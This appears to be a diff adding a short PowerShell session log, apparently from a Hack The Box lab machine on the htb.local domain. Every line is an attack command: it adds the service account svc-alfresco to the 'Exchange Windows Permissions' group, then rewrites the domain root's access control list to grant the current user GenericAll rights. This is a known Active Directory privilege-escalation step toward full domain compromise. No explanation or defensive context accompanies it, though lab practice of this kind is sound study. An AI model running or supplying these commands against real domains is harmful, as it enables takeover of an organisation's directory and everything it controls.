@@ -1,0 +1,13 @@
+[10.10.10.161]: PS C:\> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
+[10.10.10.161]: PS C:\> $acl = get-acl "ad:DC=htb,DC=local"
+[10.10.10.161]: PS C:\> $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+[10.10.10.161]: PS C:\> $user = Get-ADUser -Identity $id.User
+[10.10.10.161]: PS C:\> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
+[10.10.10.161]: PS C:\> $identity = [System.Security.Principal.IdentityReference] $sid
+[10.10.10.161]: PS C:\> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
+[10.10.10.161]: PS C:\> $type = [System.Security.AccessControl.AccessControlType] "Allow"
+[10.10.10.161]: PS C:\> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
+[10.10.10.161]: PS C:\> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$inheritanceType
+[10.10.10.161]: PS C:\> $acl.AddAccessRule($ace)
+[10.10.10.161]: PS C:\> Set-acl -aclobject $acl "ad:DC=htb,DC=local"
+[10.10.10.161]: PS C:\> Get-ADGroupMember -Identity "Exchange Windows Permissions"
